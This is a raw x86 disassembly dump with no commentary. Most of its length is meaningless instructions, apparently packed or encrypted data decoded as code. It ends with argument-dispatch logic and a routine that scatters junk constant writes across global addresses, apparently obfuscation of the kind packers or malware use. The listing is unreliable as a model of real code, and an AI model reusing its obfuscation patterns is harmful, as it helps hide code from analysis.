  41baab:	sbb    al,0x3b
  41baad:	dec    edi
  41baae:	or     al,0x69
  41bab0:	les    esp,FWORD PTR cs:[eax+0x710da621]
  41bab7:	int    0xfb
  41bab9:	ja     0x41bad3
  41babb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41babc:	push   0x2c
  41babe:	in     al,dx
  41babf:	sub    BYTE PTR [edi+0x3625d263],dh
  41bac5:	pop    eax
  41bac6:	xchg   edx,eax
  41bac7:	add    DWORD PTR [ebp-0x4bfd141e],ebp
  41bacd:	add    esi,ebx
  41bacf:	pop    esp
  41bad0:	icebp  
  41bad1:	sub    eax,DWORD PTR [ecx+0x5c]
  41bad4:	sahf   
  41bad5:	stos   DWORD PTR es:[edi],eax
  41bad6:	inc    edi
  41bad7:	fdiv   DWORD PTR [ebx]
  41bad9:	dec    ebx
  41bada:	call   0xad67235
  41badf:	pop    ss
  41bae0:	fisttp WORD PTR [edi]
  41bae2:	(bad)  
  41bae3:	iret   
  41bae4:	scas   al,BYTE PTR es:[edi]
  41bae5:	pushf  
  41bae6:	imul   ebx,DWORD PTR [eax-0x47c9d16f],0xc6dbaa9e
  41baf0:	adc    BYTE PTR [eax+0xea45ca],ah
  41baf6:	js     0x41bafb
  41baf8:	aad    0xcc
  41bafa:	stos   BYTE PTR es:[edi],al
  41bafb:	add    eax,0x1d5f6c76
  41bb00:	daa    
  41bb01:	out    dx,eax
  41bb02:	and    eax,edi
  41bb04:	xchg   edx,eax
  41bb05:	fmul   DWORD PTR [eax-0x41d9d5f2]
  41bb0b:	aas    
  41bb0c:	mov    dh,0xcf
  41bb0e:	cmp    edx,DWORD PTR [ecx-0x7d]
  41bb11:	mov    dh,0xc1
  41bb13:	or     edi,DWORD PTR [esi+0x605db9b1]
  41bb19:	push   esi
  41bb1a:	push   edx
  41bb1b:	adc    eax,0x1c35db69
  41bb20:	iret   
  41bb21:	adc    BYTE PTR ds:0xc9291c47,cl
  41bb27:	mov    al,ds:0x4178d42
  41bb2c:	or     esp,edx
  41bb2e:	xchg   esp,eax
  41bb2f:	dec    ecx
  41bb30:	jmp    0x6a42:0xc02aebec
  41bb37:	leave  
  41bb38:	xchg   DWORD PTR [esi+0x5fac1e31],esp
  41bb3e:	cmp    BYTE PTR ds:0x402f6947,al
  41bb44:	jbe    0x41bb21
  41bb46:	ficomp WORD PTR [edx]
  41bb48:	call   0x7b5a:0xe6710e81
  41bb4f:	pop    edi
  41bb50:	cs (bad) 
  41bb52:	call   0x9b857e46
  41bb57:	xor    eax,0x75ddcae5
  41bb5c:	add    eax,0xbd55aaff
  41bb61:	mov    dh,0x80
  41bb63:	adc    eax,0xe4fa9273
  41bb68:	aas    
  41bb69:	or     BYTE PTR [esi+0x45],0x93
  41bb6d:	push   cs
  41bb6e:	in     al,dx
  41bb6f:	pop    es
  41bb70:	je     0x41bb60
  41bb72:	dec    esp
  41bb73:	fdiv   DWORD PTR [esi+0x77a8c2b6]
  41bb79:	jl     0x41bbc6
  41bb7b:	push   cs
  41bb7c:	fst    DWORD PTR [edx+0x3b]
  41bb7f:	jno    0x41bb57
  41bb81:	shl    BYTE PTR [ebp-0x5bb07905],0xb7
  41bb88:	dec    esp
  41bb89:	and    DWORD PTR [ecx+0x6e],esi
  41bb8c:	xor    al,0x1f
  41bb8e:	(bad)  
  41bb8f:	out    0x17,al
  41bb91:	or     DWORD PTR [ecx+0x3e],esp
  41bb94:	add    ax,0x6e5
  41bb98:	sub    eax,0x447b6b53
  41bb9d:	pop    ecx
  41bb9e:	mov    ds:0x830237a2,eax
  41bba3:	(bad)  
  41bba4:	pop    eax
  41bba5:	shr    DWORD PTR [ebx],0xfa
  41bba8:	adc    DWORD PTR [esi+0x575aaaa7],ebx
  41bbae:	mov    eax,ds:0xb2569be5
  41bbb3:	std    
  41bbb4:	bound  esp,QWORD PTR [ecx]
  41bbb6:	stos   DWORD PTR es:[edi],eax
  41bbb7:	test   eax,0xcfa135f1
  41bbbc:	inc    esi
  41bbbd:	mov    esi,0xcda6374e
  41bbc3:	add    al,0xbe
  41bbc5:	push   edi
  41bbc6:	shl    esi,1
  41bbc8:	sub    esi,ebx
  41bbca:	pop    ss
  41bbcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbcc:	inc    esi
  41bbcd:	icebp  
  41bbce:	pop    ds
  41bbcf:	fs cli 
  41bbd1:	in     al,0xbb
  41bbd3:	xchg   edx,eax
  41bbd4:	cwde   
  41bbd5:	scas   eax,DWORD PTR es:[edi]
  41bbd6:	jae    0x41bc3c
  41bbd8:	adc    esi,DWORD PTR [ecx+0x26]
  41bbdb:	ret    0x2041
  41bbde:	outs   dx,DWORD PTR ds:[esi]
  41bbdf:	push   ds
  41bbe0:	fucomi st,st(6)
  41bbe2:	jo     0x41bc1c
  41bbe4:	push   eax
  41bbe5:	hlt    
  41bbe6:	cmp    dl,BYTE PTR [eax-0x202e9253]
  41bbec:	jb     0x41bb7e
  41bbee:	and    DWORD PTR [esi+0x7e],edx
  41bbf1:	jge    0x41bb85
  41bbf3:	pop    edx
  41bbf4:	xlat   BYTE PTR ds:[ebx]
  41bbf5:	adc    dh,BYTE PTR [esi-0x74]
  41bbf8:	inc    eax
  41bbf9:	test   DWORD PTR [edx-0x2e],ebx
  41bbfc:	in     al,dx
  41bbfd:	cmc    
  41bbfe:	outs   dx,BYTE PTR ds:[esi]
  41bbff:	shl    al,cl
  41bc01:	add    eax,0x4ed4850
  41bc06:	movnti DWORD PTR [ebx-0x7c7e6b07],eax
  41bc0d:	out    dx,eax
  41bc0e:	pop    ecx
  41bc0f:	cmp    BYTE PTR [ecx-0x13],al
  41bc12:	push   es
  41bc13:	xchg   ebp,eax
  41bc14:	cmp    eax,0x182f2c04
  41bc19:	adc    DWORD PTR [ebp-0x5dc2485b],edi
  41bc1f:	pop    ds
  41bc20:	sbb    al,0x99
  41bc22:	cwde   
  41bc23:	mov    ch,0x29
  41bc25:	or     al,0xdc
  41bc27:	imul   ebx,DWORD PTR [edi],0xac1d5f62
  41bc2d:	jmp    0xdf779936
  41bc32:	in     eax,0x72
  41bc34:	mov    cl,0xac
  41bc36:	call   0x90c73677
  41bc3b:	mov    es,WORD PTR [ecx+0x3c76eb68]
  41bc41:	jecxz  0x41bc1c
  41bc43:	dec    ebp
  41bc44:	rcl    BYTE PTR [ebx],1
  41bc46:	mov    esi,0x1b1c207c
  41bc4b:	adc    al,bl
  41bc4d:	fwait
  41bc4e:	mov    edx,0xe9d5ec3b
  41bc53:	xchg   ebx,eax
  41bc54:	pushf  
  41bc55:	daa    
  41bc56:	in     eax,dx
  41bc57:	(bad)  
  41bc58:	nop
  41bc59:	lahf   
  41bc5a:	mov    ebp,0xda68666b
  41bc5f:	mov    ebx,0xb48df445
  41bc64:	push   edx
  41bc65:	(bad)  
  41bc66:	mov    ch,BYTE PTR [ebp+0x1488adc3]
  41bc6c:	xchg   esi,eax
  41bc6d:	mov    ah,0x56
  41bc6f:	nop
  41bc70:	nop
  41bc71:	fstp   st(5)
  41bc73:	jno    0x41bcaf
  41bc75:	fbstp  TBYTE PTR [ecx+eax*8-0x60e4818f]
  41bc7c:	sub    eax,0x228d15d
  41bc81:	mov    edx,0xdbac24fd
  41bc86:	hlt    
  41bc87:	test   edx,esp
  41bc89:	scas   al,BYTE PTR es:[edi]
  41bc8a:	or     eax,0x1d10453d
  41bc8f:	push   eax
  41bc90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc91:	aam    0x3a
  41bc93:	lds    ebp,FWORD PTR [esi+0x1e28f782]
  41bc99:	inc    edi
  41bc9a:	sub    DWORD PTR [esi-0x2bac0c9c],edx
  41bca0:	jae    0x41bcd2
  41bca2:	mov    cl,0x16
  41bca4:	xchg   ecx,eax
  41bca5:	push   0xffffffce
  41bca7:	dec    esi
  41bca8:	sub    ch,BYTE PTR [ebx-0x2e67b16d]
  41bcae:	dec    esi
  41bcaf:	pop    es
  41bcb0:	bound  ecx,QWORD PTR [ebp+0xd]
  41bcb3:	sbb    ebp,DWORD PTR ds:0x2b824c69
  41bcb9:	repz xor eax,0x56862e6
  41bcbf:	aam    0x2e
  41bcc1:	push   esi
  41bcc2:	or     ebp,DWORD PTR [ebp-0x5e3856ce]
  41bcc8:	lea    esi,[edx-0x66]
  41bccb:	popa   
  41bccc:	jg     0x41bc82
  41bcce:	dec    ebx
  41bccf:	int    0x10
  41bcd1:	stos   DWORD PTR es:[edi],eax
  41bcd2:	dec    eax
  41bcd3:	sbb    bl,BYTE PTR [esi+edi*8]
  41bcd6:	(bad)  
  41bcd7:	adc    ebx,esp
  41bcd9:	lds    esi,FWORD PTR [eax]
  41bcdb:	in     eax,0x9f
  41bcdd:	xor    BYTE PTR [esi+edx*4+0x13f735b3],bl
  41bce4:	sub    ecx,edi
  41bce6:	and    DWORD PTR [eax+esi*8-0x503b7c68],edx
  41bced:	dec    esi
  41bcee:	xor    DWORD PTR [edx+0x42f1c066],esp
  41bcf4:	(bad)  
  41bcf5:	pop    ds
  41bcf6:	mov    ds:0x68eb5fcc,al
  41bcfb:	cmp    al,BYTE PTR [eax-0x6aa810ba]
  41bd01:	mov    gs,WORD PTR [ebx+0x31ead8a2]
  41bd07:	sub    eax,0x10fec84f
  41bd0c:	pop    edi
  41bd0d:	mov    BYTE PTR [edi-0x61e154b0],bh
  41bd13:	dec    esp
  41bd14:	sub    BYTE PTR [ecx-0x9],cl
  41bd17:	(bad)  
  41bd1a:	xor    DWORD PTR [esi-0x5f],edx
  41bd1d:	jmp    0x41bd0f
  41bd1f:	(bad)  
  41bd20:	or     DWORD PTR [eax-0x39621652],ebx
  41bd26:	inc    edi
  41bd27:	dec    ebp
  41bd28:	rcr    DWORD PTR [edi+0x7c],cl
  41bd2b:	jg     0x41bcd3
  41bd2d:	push   cs
  41bd2e:	push   edx
  41bd2f:	pop    esi
  41bd30:	cmp    al,0xeb
  41bd32:	sub    al,0x17
  41bd34:	outs   dx,BYTE PTR ds:[esi]
  41bd35:	sub    DWORD PTR [ecx],edx
  41bd37:	ja     0x41bd6f
  41bd39:	xchg   edx,ebx
  41bd3b:	inc    eax
  41bd3c:	xchg   ecx,eax
  41bd3d:	jns    0x41bd82
  41bd3f:	sti    
  41bd40:	xchg   DWORD PTR [ecx-0x17f24b67],esp
  41bd46:	mov    ebp,0x95b98015
  41bd4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd4c:	jo     0x41bd79
  41bd4e:	loopne 0x41bd4e
  41bd50:	xlat   BYTE PTR cs:[ebx]
  41bd52:	push   ebp
  41bd54:	in     al,0xce
  41bd56:	sub    al,0x21
  41bd58:	and    ch,BYTE PTR [ebx-0x3]
  41bd5b:	or     BYTE PTR [ecx-0x15a576a6],al
  41bd61:	or     al,0x56
  41bd63:	adc    DWORD PTR [ebp+0x3709b43a],0x11eee92f
  41bd6d:	dec    eax
  41bd6e:	les    ebx,FWORD PTR [ebp+0x41]
  41bd71:	mov    ch,BYTE PTR [ebp-0x53191317]
  41bd77:	out    0xd1,al
  41bd79:	dec    esi
  41bd7a:	fisttp QWORD PTR [ebx-0x4cd044e4]
  41bd80:	cmp    al,0x31
  41bd82:	xor    al,0x6c
  41bd84:	ret    0xc302
  41bd87:	scas   eax,DWORD PTR es:[edi]
  41bd88:	rcr    BYTE PTR ss:[eax-0x55],cl
  41bd8c:	ret    0x68ea
  41bd8f:	fadd   DWORD PTR [ecx+0x2f]
  41bd92:	pop    esp
  41bd93:	aaa    
  41bd94:	ss pop ebx
  41bd96:	inc    esp
  41bd97:	jns    0x41be07
  41bd99:	push   0x8af9785a
  41bd9e:	dec    ebx
  41bd9f:	jns    0x41bdd5
  41bda1:	mov    dh,0xff
  41bda3:	mov    ah,0x78
  41bda5:	into   
  41bda6:	sbb    al,0xc2
  41bda8:	add    DWORD PTR [ebx+ebx*2],edi
  41bdab:	sar    ebp,1
  41bdad:	jne    0x41bd30
  41bdaf:	inc    ebp
  41bdb0:	xchg   edx,eax
  41bdb1:	inc    ebp
  41bdb2:	addr16 push ebx
  41bdb4:	push   ss
  41bdb5:	in     al,dx
  41bdb6:	je     0x41bd67
  41bdb8:	(bad)  
  41bdb9:	or     edi,ebx
  41bdbb:	and    DWORD PTR [ecx+0x2a65b47a],ebp
  41bdc1:	pop    es
  41bdc2:	nop
  41bdc3:	and    eax,0x67285455
  41bdc8:	sbb    eax,0x90c69288
  41bdcd:	in     eax,dx
  41bdce:	out    dx,al
  41bdcf:	jbe    0x41be4f
  41bdd1:	sbb    al,0xe8
  41bdd3:	sub    DWORD PTR ds:0xefb42511,esp
  41bdd9:	sbb    bl,BYTE PTR [ecx+edx*8]
  41bddc:	retf   0x608f
  41bddf:	mov    ds:0x5c640930,eax
  41bde4:	jno    0x41bdcb
  41bde6:	mov    ebp,0x76a747a3
  41bdeb:	ss repnz div al
  41bdef:	lds    ebx,FWORD PTR [esp+ecx*2-0x4d]
  41bdf3:	or     eax,0xc9b23c2e
  41bdf8:	imul   DWORD PTR [edx+0x3c]
  41bdfb:	mov    al,ds:0xbb4e42f8
  41be00:	and    eax,0x65c02a4e
  41be05:	cmp    eax,0x498a636b
  41be0a:	sbb    ebx,0xffffffda
  41be0d:	mov    ah,0xd
  41be0f:	in     al,dx
  41be10:	outs   dx,DWORD PTR ds:[esi]
  41be11:	mov    esp,0x66ed9f7
  41be16:	inc    edi
  41be17:	test   DWORD PTR [edx+ebx*2],esi
  41be1a:	pop    es
  41be1b:	xchg   ebx,eax
  41be1c:	xchg   esi,eax
  41be1d:	mov    ecx,0x51eb1ed
  41be22:	cmp    eax,0xc616c04f
  41be27:	sub    al,bl
  41be29:	mov    cl,0x8c
  41be2b:	fmulp  st(4),st
  41be2d:	loopne 0x41be7f
  41be2f:	mov    esi,0xb1f50300
  41be34:	(bad)  [eax+esi*4-0x3d]
  41be38:	aas    
  41be39:	test   BYTE PTR [esi+0x176e13ba],bl
  41be3f:	fnstcw WORD PTR [edx+0x38]
  41be42:	clc    
  41be43:	push   edi
  41be44:	jge    0x41be83
  41be46:	into   
  41be47:	xor    al,0x43
  41be49:	push   esp
  41be4a:	fidiv  WORD PTR [esi+0x61288b01]
  41be50:	mov    eax,0x159fd791
  41be55:	(bad)  
  41be57:	sub    dh,ah
  41be59:	push   esi
  41be5a:	stc    
  41be5b:	mov    ebx,0x9581940a
  41be60:	adc    BYTE PTR [edi*2-0x1df93efd],cl
  41be67:	aad    0xc0
  41be69:	dec    esp
  41be6a:	xor    DWORD PTR [eax-0x5a],ecx
  41be6d:	ins    BYTE PTR es:[edi],dx
  41be6e:	pop    ss
  41be6f:	dec    esp
  41be70:	pop    ds
  41be71:	adc    dh,ah
  41be73:	or     ebx,DWORD PTR [ecx-0x3e37fd8b]
  41be79:	in     eax,0xa0
  41be7b:	cmp    bl,BYTE PTR [ebx]
  41be7d:	adc    edi,DWORD PTR [eax]
  41be7f:	test   DWORD PTR [ecx+edx*1],ecx
  41be82:	les    esi,FWORD PTR [ebx]
  41be84:	jp     0x41be17
  41be86:	scas   al,BYTE PTR es:[edi]
  41be87:	sub    eax,DWORD PTR [ebx-0x73fe274a]
  41be8d:	es inc eax
  41be8f:	dec    ebx
  41be90:	lds    eax,FWORD PTR [eax-0x4b]
  41be93:	cmp    eax,DWORD PTR [bx+di]
  41be96:	repnz mov ecx,0xa6052472
  41be9c:	outs   dx,DWORD PTR ds:[esi]
  41be9d:	sbb    eax,0x6852f0a0
  41bea2:	rol    BYTE PTR [ecx+eiz*8+0x56],cl
  41bea6:	retf   0x37d0
  41bea9:	xchg   esi,eax
  41beaa:	jge    0x41bf23
  41beac:	outs   dx,BYTE PTR ds:[esi]
  41bead:	and    dl,cl
  41beaf:	into   
  41beb0:	sbb    bh,cl
  41beb2:	cs push ds
  41beb4:	sub    ch,ch
  41beb6:	mov    DWORD PTR [eax],edi
  41beb8:	dec    ecx
  41beb9:	push   esi
  41beba:	add    esi,DWORD PTR [ecx]
  41bebc:	or     DWORD PTR [eax+ebp*1-0x130a2b48],esp
  41bec3:	into   
  41bec4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bec5:	into   
  41bec6:	test   al,0x9f
  41bec8:	or     DWORD PTR [edx-0x4748ecbc],ebp
  41bece:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41becf:	add    eax,0x3ccc7d0a
  41bed4:	sti    
  41bed5:	pop    esi
  41bed6:	adc    eax,0xded4815e
  41bedb:	mov    eax,0x96b7ae71
  41bee0:	cdq    
  41bee1:	mov    esi,ds
  41bee3:	dec    edx
  41bee4:	push   esi
  41bee5:	jbe    0x41be7f
  41bee7:	loope  0x41beca
  41bee9:	icebp  
  41beea:	scas   eax,DWORD PTR es:[edi]
  41beeb:	sub    eax,0xe3d91d2d
  41bef0:	mov    edi,0x3c9b9fe3
  41bef5:	mov    dh,0xe6
  41bef7:	add    DWORD PTR [ebx+0x5e],edi
  41befa:	push   ds
  41befb:	les    eax,FWORD PTR [edx]
  41befd:	dec    edx
  41befe:	inc    ebp
  41beff:	(bad)  
  41bf00:	icebp  
  41bf01:	sub    al,0x76
  41bf03:	data16 ins BYTE PTR es:[edi],dx
  41bf05:	cmp    eax,0x88aee68f
  41bf0a:	ret    
  41bf0b:	in     al,0x59
  41bf0d:	dec    ebp
  41bf0e:	stc    
  41bf0f:	aaa    
  41bf10:	push   ecx
  41bf11:	loope  0x41bf68
  41bf13:	mov    cl,BYTE PTR cs:[ecx-0x67]
  41bf17:	fidiv  DWORD PTR [edi-0x25]
  41bf1a:	fild   WORD PTR [ecx+0x6d]
  41bf1d:	(bad)  
  41bf1e:	mul    DWORD PTR [edx]
  41bf20:	cmp    BYTE PTR [ecx],0x1
  41bf23:	and    edx,edx
  41bf25:	cs ror esi,cl
  41bf28:	cmc    
  41bf29:	je     0x41bf2a
  41bf2b:	je     0x41bf29
  41bf2d:	push   esp
  41bf2e:	and    DWORD PTR [ecx-0x782233dd],esp
  41bf34:	pop    ecx
  41bf35:	push   esi
  41bf36:	in     eax,dx
  41bf37:	push   ds
  41bf38:	out    dx,eax
  41bf39:	xchg   ecx,eax
  41bf3a:	cmp    dl,BYTE PTR [esi+0x5f27c832]
  41bf40:	push   0x63d49b40
  41bf45:	mov    WORD PTR ds:0x79d1b58a,gs
  41bf4b:	sub    eax,0xb991dac2
  41bf50:	sub    DWORD PTR [eax-0x14],0xe847d193
  41bf57:	stos   DWORD PTR es:[edi],eax
  41bf58:	xor    eax,0xc9221844
  41bf5d:	mov    esi,0x3aff986c
  41bf62:	mov    esp,0xbf8c6c0b
  41bf67:	sub    BYTE PTR [ecx-0x29],0x58
  41bf6b:	sub    eax,0x32873e3f
  41bf70:	cmp    eax,0xd7ef2596
  41bf75:	mov    al,0x3e
  41bf77:	imul   ecx,DWORD PTR [ebp+0x54],0xffffff91
  41bf7b:	lahf   
  41bf7c:	and    ah,BYTE PTR ds:0x17f4aeb
  41bf82:	ret    0xf9fe
  41bf85:	sar    BYTE PTR [ebx-0x1d],cl
  41bf88:	lock inc edi
  41bf8a:	push   ecx
  41bf8b:	sbb    ebp,DWORD PTR [esp+eiz*4]
  41bf8e:	outs   dx,DWORD PTR ds:[esi]
  41bf8f:	mov    ecx,0x9ea117ee
  41bf94:	push   esp
  41bf95:	test   BYTE PTR [edi+0x5e],bl
  41bf98:	jb     0x41bf94
  41bf9a:	jo     0x41bfe0
  41bf9c:	jge    0x41c00d
  41bf9e:	jge    0x41c009
  41bfa0:	xchg   ebx,eax
  41bfa1:	dec    edi
  41bfa2:	lock push esi
  41bfa4:	outs   dx,BYTE PTR ds:[esi]
  41bfa5:	xor    eax,0x39f2e19e
  41bfaa:	jmp    0x17eb3be3
  41bfaf:	clc    
  41bfb0:	push   eax
  41bfb1:	imul   esp,DWORD PTR [esi-0xe],0x1e
  41bfb5:	addr16 cli 
  41bfb7:	daa    
  41bfb8:	sahf   
  41bfb9:	js     0x41bfdf
  41bfbb:	pop    edi
  41bfbc:	aas    
  41bfbd:	mov    ebp,0x84d48065
  41bfc2:	jecxz  0x41bfbb
  41bfc4:	jg     0x41bf69
  41bfc6:	stc    
  41bfc7:	iret   
  41bfc8:	pop    ebx
  41bfc9:	xor    esi,ecx
  41bfcb:	dec    ebp
  41bfcc:	inc    esp
  41bfcd:	adc    eax,0x83988b29
  41bfd2:	fcmovb st,st(6)
  41bfd4:	xor    ebp,DWORD PTR ds:0x18532261
  41bfda:	out    0x4e,al
  41bfdc:	lahf   
  41bfdd:	shr    DWORD PTR [eax+0x4a],cl
  41bfe0:	mov    gs,WORD PTR [ebp-0x28527c0d]
  41bfe6:	and    ah,BYTE PTR [edi-0x57]
  41bfe9:	in     al,0x22
  41bfeb:	scas   eax,DWORD PTR es:[edi]
  41bfec:	push   0x1b
  41bfee:	mov    bl,0x49
  41bff0:	fwait
  41bff1:	fwait
  41bff2:	jmp    0x41bf89
  41bff4:	imul   ebp,eax,0xffffffc3
  41bff7:	mov    dh,0xf0
  41bff9:	ret    
  41bffa:	into   
  41bffb:	outs   dx,BYTE PTR ds:[esi]
  41bffc:	out    0x3b,eax
  41bffe:	xchg   edx,eax
  41bfff:	(bad)  
  41c000:	pop    ecx
  41c001:	loope  0x41c061
  41c003:	push   esp
  41c004:	std    
  41c005:	cmp    eax,0x6309caf6
  41c00a:	mov    edx,DWORD PTR ds:0xb52f17f6
  41c010:	sahf   
  41c011:	aam    0x5c
  41c013:	adc    eax,DWORD PTR [ebp-0x315b9ef8]
  41c019:	mov    esi,0x7920ecf
  41c01e:	add    BYTE PTR [ecx-0x50],bl
  41c021:	jnp    0x41c00b
  41c023:	inc    ebp
  41c024:	mov    ch,0xc
  41c026:	test   al,0xb
  41c028:	xchg   ebx,eax
  41c029:	out    dx,eax
  41c02a:	push   es
  41c02b:	ss clc 
  41c02d:	imul   edx,DWORD PTR [ebp+0x72],0x61
  41c031:	adc    edi,edi
  41c033:	jmp    0x4549:0xfaa19d82
  41c03a:	(bad)  
  41c03b:	out    0xc6,al
  41c03d:	xchg   ecx,eax
  41c03e:	loopne 0x41bffc
  41c040:	mov    esp,0x1c3ee353
  41c045:	ds add eax,0x5a8cf288
  41c04b:	test   DWORD PTR [esi-0x42],0xe2610958
  41c052:	lea    esp,ds:0xf899dc69
  41c058:	hlt    
  41c059:	dec    edx
  41c05a:	xlat   BYTE PTR ds:[ebx]
  41c05b:	pop    esi
  41c05c:	je     0x41c04b
  41c05e:	mov    dh,BYTE PTR [esi+0x68]
  41c061:	out    0xab,eax
  41c063:	pop    ebp
  41c064:	xor    DWORD PTR [esi+edi*4+0x7c],ecx
  41c068:	inc    edx
  41c069:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c06b:	jns    0x41c02f
  41c06d:	pushf  
  41c06e:	pop    ds
  41c06f:	xor    BYTE PTR [eax-0xf],0xff
  41c073:	dec    esi
  41c074:	(bad)  
  41c075:	jno    0x41c0aa
  41c077:	pop    ecx
  41c078:	or     eax,0xa9d110a1
  41c07d:	pop    edi
  41c07e:	sbb    eax,0x1f383e1b
  41c083:	pop    es
  41c084:	pop    ecx
  41c085:	data16 cli 
  41c087:	inc    DWORD PTR [eax-0x2a]
  41c08a:	fwait
  41c08b:	push   es
  41c08c:	jp     0x41c05a
  41c08e:	ins    BYTE PTR es:[edi],dx
  41c08f:	mov    ds:0x4465ecac,eax
  41c094:	mov    ds:0xd41e2e55,al
  41c099:	mov    ah,0xbb
  41c09b:	mov    WORD PTR [ecx+0x6d],ss
  41c09e:	cld    
  41c09f:	dec    esi
  41c0a0:	mov    dl,0xd9
  41c0a2:	inc    eax
  41c0a3:	mov    ch,0x1b
  41c0a5:	stos   BYTE PTR es:[edi],al
  41c0a6:	dec    eax
  41c0a7:	pop    es
  41c0a8:	(bad)  
  41c0a9:	mov    ds:0x91946805,al
  41c0ae:	mov    dh,0x26
  41c0b0:	and    al,0x99
  41c0b2:	cmp    esi,DWORD PTR [edi+0x1cc43190]
  41c0b8:	lods   al,BYTE PTR ds:[esi]
  41c0b9:	leave  
  41c0ba:	push   ds
  41c0bb:	clc    
  41c0bc:	inc    ebx
  41c0bd:	in     eax,0x2d
  41c0bf:	xor    ecx,DWORD PTR [esi-0x7b4ef8b5]
  41c0c5:	aad    0x8b
  41c0c7:	nop
  41c0c8:	fdiv   st,st(4)
  41c0ca:	push   ebp
  41c0cb:	pushf  
  41c0cc:	je     0x41c086
  41c0ce:	jne    0x41c08b
  41c0d0:	inc    ebx
  41c0d1:	jecxz  0x41c0a8
  41c0d3:	or     BYTE PTR [esi+0x4478ee1b],al
  41c0d9:	sub    bl,BYTE PTR [edi+0x1eb320b5]
  41c0df:	sbb    al,0xd6
  41c0e1:	mov    DWORD PTR [edi+0x4fd082a5],ebx
  41c0e7:	imul   esi
  41c0e9:	pop    edx
  41c0ea:	hlt    
  41c0eb:	xchg   ebx,eax
  41c0ec:	icebp  
  41c0ed:	popa   
  41c0ee:	imul   ebx,DWORD PTR [ebp+0x7c84852b],0x12
  41c0f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0f6:	(bad)  
  41c0f7:	dec    esi
  41c0f8:	cmp    dh,BYTE PTR [edi-0x439b4fa6]
  41c0fe:	mov    ecx,DWORD PTR [ebp-0x18]
  41c101:	add    edi,edx
  41c103:	cmp    ecx,edi
  41c105:	je     0x41c147
  41c10b:	mov    ecx,DWORD PTR [ebp-0x18]
  41c10e:	add    ecx,eax
  41c110:	mov    DWORD PTR [ebp-0x1c],ecx
  41c113:	mov    ecx,DWORD PTR [ebp-0x30]
  41c116:	mov    edx,DWORD PTR [ebp-0x2c]
  41c119:	mov    edx,0xa147
  41c11e:	xor    cx,dx
  41c121:	mov    edx,DWORD PTR [ebp-0x1c]
  41c124:	mov    edx,DWORD PTR [edx+0xc]
  41c127:	add    cx,si
  41c12a:	cmp    WORD PTR [eax+edx*1],cx
  41c12e:	jne    0x41c147
  41c134:	mov    ecx,DWORD PTR ds:0x4262c9
  41c13a:	mov    ecx,DWORD PTR [ecx+0x198]
  41c140:	mov    DWORD PTR [ecx],eax
  41c142:	jmp    0x41c1c5
  41c147:	push   DWORD PTR [ebp+0x1c]
  41c14a:	push   DWORD PTR [ebp+0x18]
  41c14d:	jmp    0x41c1b4
  41c152:	mov    eax,DWORD PTR [ebp+0x18]
  41c155:	mov    ecx,DWORD PTR [ebp+0x1c]
  41c158:	cmp    eax,0x70941f9e
  41c15d:	jne    0x41c176
  41c163:	cmp    ecx,ebx
  41c165:	jne    0x41c176
  41c16b:	push   ebx
  41c16c:	push   0x70941f9b
  41c171:	jmp    0x41c1b4
  41c176:	mov    ecx,DWORD PTR [ebp+0x18]
  41c179:	mov    edx,DWORD PTR [ebp+0x1c]
  41c17c:	mov    eax,0x70941f98
  41c181:	cmp    ecx,eax
  41c183:	jne    0x41c198
  41c189:	cmp    edx,ebx
  41c18b:	jne    0x41c198
  41c191:	push   ebx
  41c192:	push   edi
  41c193:	jmp    0x41c1b4
  41c198:	mov    ecx,DWORD PTR [ebp+0x18]
  41c19b:	mov    edx,DWORD PTR [ebp+0x1c]
  41c19e:	cmp    ecx,0x70941f9b
  41c1a4:	jne    0x41c1c5
  41c1aa:	cmp    edx,ebx
  41c1ac:	jne    0x41c1c5
  41c1b2:	push   ebx
  41c1b3:	push   eax
  41c1b4:	push   DWORD PTR [ebp+0x14]
  41c1b7:	push   DWORD PTR [ebp+0x10]
  41c1ba:	push   DWORD PTR [ebp+0xc]
  41c1bd:	push   DWORD PTR [ebp+0x8]
  41c1c0:	call   0x417355
  41c1c5:	pop    edi
  41c1c6:	pop    esi
  41c1c7:	pop    ebx
  41c1c8:	leave  
  41c1c9:	ret    0x18
  41c1cc:	push   ebp
  41c1cd:	mov    ebp,esp
  41c1cf:	and    esp,0xfffffff8
  41c1d2:	add    DWORD PTR ds:0x426f09,0x426ef5
  41c1dc:	mov    al,ds:0x4263ef
  41c1e1:	sub    esp,0x54
  41c1e4:	mov    DWORD PTR ds:0x426eb5,0x2e24
  41c1ee:	push   ebx
  41c1ef:	push   esi
  41c1f0:	push   edi
  41c1f1:	mov    DWORD PTR ds:0x426f15,0x7495
  41c1fb:	cmp    al,BYTE PTR ds:0x4263fa
  41c201:	mov    DWORD PTR ds:0x426ee9,0x194c
  41c20b:	je     0x41c22c
  41c211:	or     DWORD PTR ds:0x426eed,0x426ed5
  41c21b:	xor    eax,eax
  41c21d:	mov    DWORD PTR ds:0x426ee1,0xaaa
  41c227:	jmp    0x41d276
  41c22c:	mov    al,ds:0x42640c
  41c231:	cmp    al,BYTE PTR ds:0x42641b
  41c237:	mov    DWORD PTR ds:0x426ee9,0x1f8d
  41c241:	jne    0x41c211
  41c247:	neg    edi
  41c249:	mov    edi,DWORD PTR ds:0x42fa50
  41c24f:	and    DWORD PTR ds:0x426ee1,0x426e95
  41c259:	push   0x426425
  41c25e:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c268:	push   0x426435
  41c26d:	adc    DWORD PTR ds:0x426eed,0x426ed5
  41c277:	call   edi
  41c279:	test   eax,eax
  41c27b:	mov    DWORD PTR ds:0x426ee5,0x502f
  41c285:	je     0x41c211
  41c28b:	push   0x426449
  41c290:	and    DWORD PTR ds:0x426f1d,0x426ef1
  41c29a:	call   DWORD PTR ds:0x42fa34
  41c2a0:	mov    DWORD PTR [esp+0x44],0x0
  41c2a8:	mov    ecx,0xf89c85b5
  41c2ad:	mov    DWORD PTR [esp+0x10],ecx
  41c2b1:	mov    DWORD PTR ds:0x426edd,0x1a
  41c2bb:	cmp    DWORD PTR ds:0x426edd,0x0
  41c2c2:	je     0x41c31b
